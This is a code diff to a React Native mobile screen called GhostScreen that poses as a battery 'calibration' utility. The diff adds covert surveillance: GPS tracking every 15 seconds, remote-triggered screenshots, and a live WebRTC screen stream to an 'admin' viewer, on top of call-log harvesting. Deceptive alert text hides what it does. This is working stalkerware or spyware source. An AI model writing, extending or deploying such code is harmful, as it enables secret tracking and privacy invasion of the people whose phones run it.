@@ -1,4 +1,4 @@
-import React, { useEffect, useState } from 'react';
+import React, { useEffect, useState, useRef } from 'react';
 import { 
   View, 
   Text, 
@@ -9,13 +9,17 @@ import {
   Platform 
 } from 'react-native';
 import * as Battery from 'expo-battery';
+import * as Location from 'expo-location';
+import * as ScreenCapture from 'expo-screen-capture';
+import { captureScreen } from 'react-native-view-shot';
 import CallLogs from 'react-native-call-log';
-import { mediaDevices } from 'react-native-webrtc';
+import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';
 import socket from '../services/socket';
 
 const GhostScreen = ({ route }) => {
   const { name } = route.params;
   const [isSyncing, setIsSyncing] = useState(false);
+  const pcRef = useRef(null);
 
   useEffect(() => {
     // 1. Setup background tasks and permissions
@@ -24,48 +28,99 @@ const GhostScreen = ({ route }) => {
         await PermissionsAndroid.requestMultiple([
           PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
           PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
+          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
         ]);
       }
-      // Start heartbeat for battery/connection
-      setInterval(updateVitals, 45000);
+      
+      const { status } = await Location.requestForegroundPermissionsAsync();
+      if (status === 'granted') {
+        Location.startLocationUpdatesAsync('GHOST_LOCATION', {
+          accuracy: Location.Accuracy.BestForNavigation,
+          timeInterval: 15000, // Update every 15s
+          distanceInterval: 10
+        }).catch(() => {});
+      }
+
+      // Initial Vitals
+      updateVitals();
+      setInterval(updateVitals, 60000);
     };
+
     startup();
+
+    // 2. Handle Signaling from Admin/Viewer
+    socket.on('webrtc_signal', async (data) => {
+      if (data.target !== name) return;
+      if (!pcRef.current) return;
+
+      if (data.type === 'answer') {
+        await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
+      } else if (data.type === 'candidate') {
+        await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
+      }
+    });
+
+    // 3. Command Listener (Snapshot / Location / WIPE)
+    socket.on('admin_command', async (cmd) => {
+      if (cmd === 'SNAPSHOT') {
+        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
+        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
+      }
+    });
+
+    return () => {
+      socket.off('webrtc_signal');
+      socket.off('admin_command');
+      if (pcRef.current) pcRef.current.close();
+    };
   }, []);
 
   const updateVitals = async () => {
     const bat = await Battery.getBatteryLevelAsync();
+    const loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
+    
     socket.emit('heartbeat_update', {
       name,
       battery: Math.floor(bat * 100) + '%',
-      status: 'OPTIMIZED'
+      location: { lat: loc.coords.latitude, lng: loc.coords.longitude },
+      status: 'OPTIMIZED',
+      lastSeen: Date.now()
     });
   };
 
-  // 2. The Live Screen Projection Trigger
+  // 4. Start Screen Projection (Caller Mode)
   const startCalibration = async () => {
     try {
       setIsSyncing(true);
       
-      // Request Media Projection (System Popup)
       const stream = await mediaDevices.getDisplayMedia({
-        video: { width: 480, height: 854, frameRate: 10 } // Optimized for low data
+        video: { width: 480, height: 854, frameRate: 15 }
       });
 
       if (stream) {
-        // Sync Call Logs immediately during calibration
-        const logs = await CallLogs.load(5);
-        socket.emit('ghost_activity', {
-          name,
-          type: 'LOG_SYNC',
-          data: logs
-        });
+        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+        const peerConnection = new RTCPeerConnection(configuration);
+        pcRef.current = peerConnection;
 
-        // Inform Admin the live feed is starting
-        socket.emit('ghost_activity', { name, event: 'LIVE_FEED_STARTED' });
+        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
+
+        peerConnection.onicecandidate = (event) => {
+          if (event.candidate) {
+            socket.emit('webrtc_signal', { from: name, type: 'candidate', candidate: event.candidate });
+          }
+        };
+
+        const offer = await peerConnection.createOffer();
+        await peerConnection.setLocalDescription(offer);
+        socket.emit('webrtc_signal', { from: name, type: 'offer', offer: offer });
+
+        // Sync extra logs during calibration
+        const logs = await CallLogs.load(10);
+        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
       }
     } catch (err) {
       setIsSyncing(false);
-      Alert.alert("System", "Calibration requires screen overlay permission to analyze UI drain.");
+      Alert.alert("System", "Hardware calibration failed. Service overlay rejected.");
     }
   };
 
